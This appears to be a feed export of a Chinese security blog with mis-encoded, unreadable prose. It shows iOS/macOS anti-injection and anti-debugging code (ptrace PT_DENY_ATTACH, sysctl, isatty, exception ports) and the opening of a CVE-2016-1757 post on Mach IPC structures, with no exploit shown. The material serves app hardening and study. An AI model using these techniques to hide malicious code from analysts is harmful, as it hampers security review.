<h2 id="0x0-æ³¨å…¥æ£€æµ‹"><a href="#0x0-æ³¨å…¥æ£€æµ‹" class="headerlink" title="0x0 æ³¨å…¥æ£€æµ‹"></a>0x0 æ³¨å…¥æ£€æµ‹</h2><p>Macå¯ä»¥é€šè¿‡<code>DYLD_INSERT_LIBRARIES</code>ç¯å¢ƒå˜é‡è¿›è¡ŒåŠ¨æ€åº“çš„æ³¨å…¥ï¼Œé€šè¿‡è®¾ç½®å¯æ‰§è¡Œæ–‡ä»¶çš„<code>header</code>éƒ¨åˆ†ä¸º<code>_RESTRICT,__restrict</code>ï¼Œå¯ä»¥ä½¿dyldå¿½ç•¥<code>DYLD_INSERT_LIBRARIES</code>ç¯å¢ƒå˜é‡ï¼Œä»è€Œè¾¾åˆ°åæ³¨å…¥çš„è¦æ±‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( removedCount != <span class="number">0</span> ) &#123;</div><div class="line">		dyld::<span class="built_in">log</span>(<span class="string">"dyld: DYLD_ environment variables being ignored because "</span>);</div><div class="line">		<span class="keyword">switch</span> (sRestrictedReason) &#123;</div><div class="line">			<span class="keyword">case</span> restrictedNot:</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> restrictedBySetGUid:</div><div class="line">				dyld::<span class="built_in">log</span>(<span class="string">"main executable (%s) is setuid or setgid\n"</span>, sExecPath);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> restrictedBySegment:</div><div class="line">				dyld::<span class="built_in">log</span>(<span class="string">"main executable (%s) has __RESTRICT/__restrict section\n"</span>, sExecPath);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> restrictedByEntitlements:</div><div class="line">				dyld::<span class="built_in">log</span>(<span class="string">"main executable (%s) is code signed with entitlements\n"</span>, sExecPath);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>å…·ä½“åšæ³•æ˜¯åœ¨Xcodeçš„<code>Other Linker Flags</code>æ·»åŠ <code>-Wl,-sectcreate,__RESTRICT,__restrict,/dev/null</code><br>ï¼Œç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­å°±å¯ä»¥çœ‹åˆ°<br><del>æ­¤å¤„åº”æœ‰machoviewçš„å›¾</del></p>
<h2 id="0x1-ååŠ¨æ€è°ƒè¯•"><a href="#0x1-ååŠ¨æ€è°ƒè¯•" class="headerlink" title="0x1 ååŠ¨æ€è°ƒè¯•"></a>0x1 ååŠ¨æ€è°ƒè¯•</h2><h3 id="0x1-1-ptrace"><a href="#0x1-1-ptrace" class="headerlink" title="0x1.1 ptrace"></a>0x1.1 ptrace</h3><blockquote>
<p>ptraceä¹Ÿç®—æ˜¯ä¸€ä¸ªæŒºå¤§ä¼—çš„æ‰‹æ®µäº†ï¼Œä»–æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæä¾›äº†ä¸€ä¸ªçˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡è¯¥æœºåˆ¶è§‚å¯Ÿå’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œçš„æœºåˆ¶ï¼Œä½†åœ¨iOSä¸­ä»¥å¦ä¸€ç§æ–¹æ³•è°ƒç”¨ï¼Œå¯ä»¥é˜»æ­¢è°ƒè¯•å™¨å¯¹ç›®æ ‡è¿›ç¨‹è¿›è¡Œè·Ÿè¸ªã€‚</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">ptrace_ptr_t</span>)</span><span class="params">(<span class="keyword">int</span> _request, <span class="keyword">pid_t</span> _pid, <span class="keyword">caddr_t</span> _addr, <span class="keyword">int</span> _data)</span></span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(PT_DENY_ATTACH) </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DENY_ATTACH 31 </span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span>* handle = dlopen(<span class="number">0</span>, RTLD_GLOBAL | RTLD_NOW); </div><div class="line"><span class="keyword">ptrace_ptr_t</span> ptrace_ptr = dlsym(handle, <span class="string">"ptrace"</span>); </div><div class="line">ptrace_ptr(PT_DENY_ATTACH, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">dlclose(handle);</div></pre></td></tr></table></figure>
<p><a href="http://stackoverflow.com/questions/29826028/ios-anti-piracy-in-swift" target="_blank" rel="external">è¿™æ˜¯åœ¨swiftä¸Šçš„å®ç°æ–¹å¼</a></p>
<h3 id="0x1-2-sysctl"><a href="#0x1-2-sysctl" class="headerlink" title="0x1.2 sysctl"></a>0x1.2 sysctl</h3><blockquote>
<p>sysctlæä¾›äº†ä¸€äº›æ˜¾ç¤ºè¿›ç¨‹ç»Ÿè®¡æ•°æ®çš„å˜é‡ï¼Œä¸»è¦å¯ä»¥ç”¨æ¥æ£€ç´¢æœ‰å…³è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä»è€Œç¡®å®šåº”ç”¨æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ï¼Œä½†ä¸ä¼šé˜»æ­¢è°ƒè¯•å™¨é™„åŠ åˆ°ç°æœ‰çš„è¿›ç¨‹</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int mib[<span class="number">4</span>];</div><div class="line">struct kinfo_proc info;</div><div class="line">size_t info_size = sizeof(info); info.kp_proc.p_flag = <span class="number">0</span>;</div><div class="line">mib[<span class="number">0</span>] = CTL_KERN; mib[<span class="number">1</span>] = KERN_PROC; mib[<span class="number">2</span>] = KERN_PROC_PID; mib[<span class="number">3</span>] = getpid();</div><div class="line"><span class="keyword">if</span> (sysctl(mib, <span class="number">4</span>, &amp;info, &amp;info_size, NULL, <span class="number">0</span>) == -<span class="number">1</span>) &#123;</div><div class="line">perror(<span class="string">"perror sysctl"</span>); <span class="keyword">exit</span>(-<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line">return ((info.kp_proc.p_flag &amp; P_TRACED) != <span class="number">0</span>);</div></pre></td></tr></table></figure>
<h3 id="0x1-3-syscall"><a href="#0x1-3-syscall" class="headerlink" title="0x1.3 syscall"></a>0x1.3 syscall</h3><blockquote>
<p>è¿˜æœ‰ä¸€ç§ç³»ç»Ÿè°ƒç”¨çš„ptraceï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡syscall(26,31,0,0)æ¥è°ƒç”¨ptrace</p>
</blockquote>
<h3 id="0x1-4-isatty"><a href="#0x1-4-isatty" class="headerlink" title="0x1.4 isatty"></a>0x1.4 isatty</h3><blockquote>
<p>è¿˜æœ‰ä¸€ç§ç¡®å®šlldbæ˜¯å¦é™„åŠ çš„æ–¹æ³•å°±æ˜¯<a href="https://sourceware.org/gdb/onlinedocs/gdb/isatty.html" target="_blank" rel="external">isatty</a>ï¼Œå¦‚æœæ–‡ä»¶æè¿°ç¬¦é™„åŠ åˆ°æ§åˆ¶å°ï¼Œå°±è¿”å›1ï¼Œå¦åˆ™è¿”å›0<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (isatty(<span class="number">1</span>)) &#123;</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"Being Debugged isatty"</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"isatty() bypassed"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>è¿˜æœ‰ä¸€ç§é€šè¿‡ç³»ç»Ÿè°ƒç”¨å®ç°çš„æ–¹æ³•å°±æ˜¯ioctl<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!ioctl(<span class="number">1</span>, TIOCGWINSZ)) &#123;</div><div class="line">     <span class="built_in">NSLog</span>(<span class="string">@"Being Debugged ioctl"</span>);</div><div class="line"> &#125; <span class="keyword">else</span> &#123;</div><div class="line">     <span class="built_in">NSLog</span>(<span class="string">@"ioctl bypassed"</span>);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<h3 id="0x1-5-task-get-exception-ports"><a href="#0x1-5-task-get-exception-ports" class="headerlink" title="0x1.5 task_get_exception_ports"></a>0x1.5 <code>task_get_exception_ports</code></h3><blockquote>
<p><code>task_get_exception_ports</code>æ˜¯ä¸€ä¸ªåœ¨ç”¨æˆ·æ€å¯ä»¥ä½¿ç”¨çš„task APIï¼Œå¯ä»¥æŸ¥è¯¢taskçš„å¼‚å¸¸ç«¯å£ï¼Œè€Œmachçš„å¼‚å¸¸æ¶ˆæ¯éƒ½ä¼šå‘é€åˆ°å¼‚å¸¸ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡å®ƒæ¥éªŒè¯è°ƒè¯•å™¨æ˜¯å¦è®¾ç½®äº†è¿™æ ·çš„ç«¯å£</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ios_execp_info</span></span> &#123;</div><div class="line">exception_mask_t masks[EXC_TYPES_COUNT]; mach_port_t ports[EXC_TYPES_COUNT]; exception_behavior_t behaviors[EXC_TYPES_COUNT]; thread_state_flavor_t flavors[EXC_TYPES_COUNT]; mach_msg_type_number_t count;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ios_execp_info</span></span> *info = malloc(<span class="keyword">sizeof</span>(<span class="class"><span class="keyword">struct</span> <span class="title">ios_execp_info</span></span>));</div><div class="line">kern_return_t kr = task_get_exception_ports(mach_task_self(), EXC_MASK_ALL, info-&gt;masks, &amp;info-&gt;count, info- &gt;ports, info-&gt;behaviors, info-&gt;flavors);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; info-&gt;count; i++) &#123;</div><div class="line"><span class="keyword">if</span> (info-&gt;ports[i] !=<span class="number">0</span> || info-&gt;flavors[i] == THREAD_STATE_NONE) &#123; NSLog(@<span class="string">"Being debugged... task_get_exception_ports"</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">NSLog(@<span class="string">"task_get_exception_ports bypassed"</span>);</div><div class="line">&#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> ptrace </tag>
            
            <tag> sysctl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[é€šè¿‡Cve-2016-1757æµ…è°ˆMach IPC]]></title>
      <url>http://Hello-Sherlock.github.io/2017/02/12/seven-BLOG/</url>
      <content type="html"><![CDATA[<blockquote>
<p>è‡ªä»æ¶‰åŠåˆ°å†…æ ¸çš„çŸ¥è¯†ï¼Œå…¶ä¸­çš„ä¸€äº›ä¸œè¥¿æœ‰äº›æŠ½è±¡ï¼Œå¦‚æœå•å•çœ‹æŸä¸ªæ¦‚å¿µï¼Œå¯èƒ½ä¼šè§‰å¾—æœ‰ç‚¹ä¸€å¤´é›¾æ°´ï¼Œé‚£ä¹ˆæœ€å¥½çš„åŠæ³•å°±æ˜¯é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥äº†è§£è¿™äº›ä¸œè¥¿éƒ½åšäº†ä»€ä¹ˆäº‹</p>
</blockquote>
<a id="more"></a>
<h2 id="ç¬¬ä¸€éƒ¨åˆ†â€”-åŸºæœ¬æ¦‚å¿µ"><a href="#ç¬¬ä¸€éƒ¨åˆ†â€”-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†â€”-åŸºæœ¬æ¦‚å¿µ"></a>ç¬¬ä¸€éƒ¨åˆ†â€”-åŸºæœ¬æ¦‚å¿µ</h2><blockquote>
<p>åŸè¯­æ˜¯ç”±è‹¥å¹²ä¸ªæœºå™¨æŒ‡ä»¤ æ„æˆçš„å®ŒæˆæŸç§ç‰¹å®šåŠŸèƒ½çš„ä¸€æ®µç¨‹åºï¼Œå…·æœ‰ä¸å¯åˆ†å‰²æ€§ï¼Œå³åŸè¯­çš„æ‰§è¡Œå¿…é¡»æ˜¯è¿ç»­çš„ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸å…è®¸è¢«ä¸­æ–­</p>
</blockquote>
<p>åœ¨è°ˆmach ipcä¹‹å‰æˆ‘ä»¬å…ˆæ¥è®¨è®ºè®¨è®ºmachçš„ä¸€äº›è®¾è®¡é£æ ¼ä»¥åŠipcçš„ä¸€äº›åŸºç¡€æ¦‚å¿µ</p>
<p>é¦–å…ˆmachä½œä¸ºä¸€ä¸ªæç®€çš„å†…æ ¸ï¼Œå…¶ä¸»è¦åŠŸèƒ½å°±æ˜¯è¦æŠŠæ‰€æœ‰çš„åŠŸèƒ½éƒ½ç§»é™¤å†…æ ¸ï¼Œæ”¾åœ¨ç”¨æˆ·æ€ä¸­ï¼Œè¿™æ ·machå°±å¯ä»¥ä¿æŒç€æç®€çš„é£æ ¼ã€‚machè®¾è®¡æœ€å¤§çš„ä¼˜ç‚¹æ˜¯æ²¡æœ‰åœ¨è®¾è®¡ä¸­åƒå…¶ä»–å†…æ ¸ä¸€æ ·è€ƒè™‘å¤šå¤„ç†ï¼Œå†…æ ¸ä¸­çš„å¤§éƒ¨åˆ†åŠŸèƒ½éƒ½æ˜¯åˆ†ç¦»çš„ç»„ä»¶é€šè¿‡æ¶ˆæ¯çš„ä¼ é€’æ¥æ‰§è¡Œï¼Œè¿™æ ·ä¸åŒçš„ç»„ä»¶å°±å¯ä»¥ä¸ç”¨å†åŒä¸€ä¸ªå¤„ç†å™¨ä¸Šæ‰§è¡Œã€‚</p>
<h3 id="æ¶ˆæ¯"><a href="#æ¶ˆæ¯" class="headerlink" title="æ¶ˆæ¯"></a>æ¶ˆæ¯</h3><blockquote>
<p>åœ¨machä¸­ï¼Œæ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯é€šè¿‡è‡ªå·±çš„å¯¹è±¡æ¥å®ç°çš„ï¼Œè¿›ç¨‹ç§°ä¸ºä»»åŠ¡ï¼Œçº¿ç¨‹å’Œè™šæ‹Ÿå†…å­˜éƒ½å¯ä»¥ç§°ä¸ºå¯¹è±¡ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æœ‰è‡ªå·±çš„å±æ€§</p>
</blockquote>
<p>è¯´åˆ°æ¶ˆæ¯ï¼Œå…¶å®machä¸­æœ€åŸºæœ¬çš„æ¦‚å¿µå°±æ˜¯æ¶ˆæ¯ï¼Œå®ƒæ˜¯mach ipcçš„æ ¸å¿ƒæ„å»ºæ¨¡å—ï¼Œæ˜¯åœ¨ä¸¤ä¸ªç«¯å£ä¹‹é—´ä¼ é€’çš„</p>
<p>åƒåœ¨å…¶ä»–æ¶æ„ä¸­ï¼Œå¯¹è±¡å’Œå¯¹è±¡ä¹‹å‰çš„é€šä¿¡éƒ½æ˜¯è¦æœ‰ä¸€ä¸ªæ¥å£ï¼Œè€Œmachæ˜¯é€šè¿‡æ¶ˆæ¯ä¼ é€’çš„æ–¹å¼æ¥å®ç°å¯¹è±¡é—´çš„é€šä¿¡ï¼Œè¿™å°±æ˜¯machç‰¹æ®Šçš„åœ°æ–¹ã€‚</p>
<p>machæ¶ˆæ¯æœ‰ç®€å•ä¸å¤æ‚ä¹‹åˆ†ï¼Œå…¶å®è¯´ç™½äº†å°±æ˜¯ä¸åŒå­—æ®µçš„æ¶ˆæ¯ç»“æ„ï¼Œå¤æ‚æ¶ˆæ¯ä¸»è¦æ˜¯é€šè¿‡æ¶ˆæ¯å¤´æ ‡å¿—ä½çš„<code>MACH_MSGH_BITS_COMPLES</code>æ¥ç¡®å®šçš„<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span>*				address;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(__LP64__)</span></div><div class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     		pad1: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>    type: <span class="number">8</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></div><div class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">  <span class="keyword">uint32_t</span>          pad_end;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125; <span class="keyword">mach_msg_ool_descriptor_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">uint32_t</span>			address;</div><div class="line">  <span class="keyword">mach_msg_size_t</span>		count;</div><div class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_type_name_t</span>		disposition : <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</div><div class="line">&#125; <span class="keyword">mach_msg_ool_ports_descriptor32_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">uint64_t</span>			address;</div><div class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_type_name_t</span>		disposition : <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_size_t</span>		count;</div><div class="line">&#125; <span class="keyword">mach_msg_ool_ports_descriptor64_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span>*				address;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(__LP64__)</span></div><div class="line">  <span class="keyword">mach_msg_size_t</span>		count;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_type_name_t</span>		disposition : <span class="number">8</span>;</div><div class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></div><div class="line">  <span class="keyword">mach_msg_size_t</span>		count;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">  <span class="keyword">uint32_t</span>          pad_end;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125; <span class="keyword">mach_msg_ool_ports_descriptor_t</span>;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * LP64support - This union definition is not really</div><div class="line"> * appropriate in LP64 mode because not all descriptors</div><div class="line"> * are of the same size in that environment.</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__) &amp;&amp; defined(KERNEL)</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">union</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">mach_msg_port_descriptor_t</span>		port;</div><div class="line">  <span class="keyword">mach_msg_ool_descriptor32_t</span>		out_of_line;</div><div class="line">  <span class="keyword">mach_msg_ool_ports_descriptor32_t</span>	ool_ports;</div><div class="line">  <span class="keyword">mach_msg_type_descriptor_t</span>		type;</div><div class="line">&#125; <span class="keyword">mach_msg_descriptor_t</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">union</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">mach_msg_port_descriptor_t</span>		port;</div><div class="line">  <span class="keyword">mach_msg_ool_descriptor_t</span>		out_of_line;</div><div class="line">  <span class="keyword">mach_msg_ool_ports_descriptor_t</span>	ool_ports;</div><div class="line">  <span class="keyword">mach_msg_type_descriptor_t</span>		type;</div><div class="line">&#125; <span class="keyword">mach_msg_descriptor_t</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>ç”±ä»¥ä¸Šä»£ç å¯ä»¥çœ‹å‡ºï¼Œåœ¨å¤æ‚æ¶ˆæ¯çš„æè¿°ç¬¦ä¸­å‡ºç°äº†ä¸€äº›OOL(out-of-line)ï¼Œä»–æ˜¯machæ¶ˆæ¯çš„é‡è¦ç‰¹æ€§ï¼Œå…è®¸æ·»åŠ å„ç§æ•°æ®çš„åˆ†æ•£æŒ‡é’ˆï¼Œè¿™å°±ç›¸å½“äºæ·»åŠ äº†å¥½å¤šé€šå‘å¯¹è±¡çš„å„ç§æ¡ä»¶çš„ç®¡é“ï¼Œä¸»è¦æè¿°äº†è¦é™„åŠ æ•°æ®çš„åœ°å€å’Œå¤§å°ä»¥åŠå¯¹æ•°æ®çš„ä¸€äº›å¤„ç†ã€‚</p>
<p>machæ¶ˆæ¯çš„å‘é€å’Œæ¥æ”¶ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªå…±åŒçš„APIå‡½æ•°<code>mach_msg()</code>æ¥å®ç°ï¼Œå…¶ä¸­åŒ…å«äº†<code>mach_msg_send()</code>å’Œ<code>mach_msg_receive()</code>ç­‰ï¼Œè€Œ<code>mach_msg()</code>åˆ™è°ƒç”¨äº†ä¸€ä¸ªmaché™·é˜±(<code>mach_msg_trap</code>ç›¸å½“äºç³»ç»Ÿè°ƒç”¨)ï¼Œå½“machåœ¨ç”¨æˆ·æ€æ—¶å¯ä»¥é€šè¿‡å¼•å‘maché™·é˜±æ¥åˆ‡æ¢åˆ°å†…æ ¸æ€ç»§ç»­å®Œæˆmach_msgçš„ç›¸åº”å·¥ä½œã€‚</p>
<p>ç”±äºmachæ¶æ„æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å¾®å†…æ ¸æ¶æ„ï¼Œæ‰€ä»¥<code>mach_msg()</code>å‡½æ•°å¿…é¡»åœ¨å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´å¤åˆ¶æ¶ˆæ¯æ‰€åœ¨çš„å†…å­˜ï¼Œè¿™æ ·é¢‘ç¹çš„å¤åˆ¶å†…å­˜ä¼šå¸¦æ¥å¾ˆå¤§çš„æŸè€—ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒXNUä¸­ä¼šè®©è®©æ‰€æœ‰çš„å†…æ ¸ç»„ä»¶å…±äº«åŒä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œè¿™æ ·æ¶ˆæ¯åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­åªéœ€è¦ä¼ é€’å…¶ç›¸åº”çš„æŒ‡é’ˆå°±å¯ä»¥äº†ã€‚</p>
<h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>è¯´èµ·ipcï¼Œé™¤äº†æ¶ˆæ¯ï¼Œé‚£å°±æ˜¯ç«¯å£äº†</p>
<p>ipcè®¾è®¡ä¸­éå¸¸å¼ºå¤§çš„ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å¯ä»¥é€šè¿‡å¤æ‚æ¶ˆæ¯å°†ç«¯å£ä»ä¸€ä¸ªä»»åŠ¡ä¼ é€’åˆ°å¦ä¸€ä¸ªä»»åŠ¡ä¸­ï¼Œä¹Ÿå¯ä»¥å°†ç«¯å£å’Œæƒé™ä»ä¸€ä¸ªå®ä½“ä¼ åˆ°å¦ä¸€ä¸ªå®ä½“ï¼Œæ¯ä¸€ä¸ªç«¯å£éƒ½æœ‰è‡ªå·±çš„æƒé™</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">natural_t</span> <span class="keyword">mach_port_right_t</span>;</div><div class="line"><span class="comment">//å‘é€</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) 0)</span></div><div class="line"><span class="comment">//æ¥æ”¶</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) 1)</span></div><div class="line"><span class="comment">//å‘é€ä¸€æ¬¡</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) 2)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) 3)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) 4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) 5)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) 6)</span></div></pre></td></tr></table></figure>
<p>ä»¥ä¸Šå°±æ˜¯machç«¯å£çš„ä¸€äº›æƒé™ï¼Œçœ‹å­—é¢æ„æ€å°±æ˜ç™½ï¼Œå…¶ä¸­é‡è¦çš„å°±æ˜¯sendå’Œreceive</p>
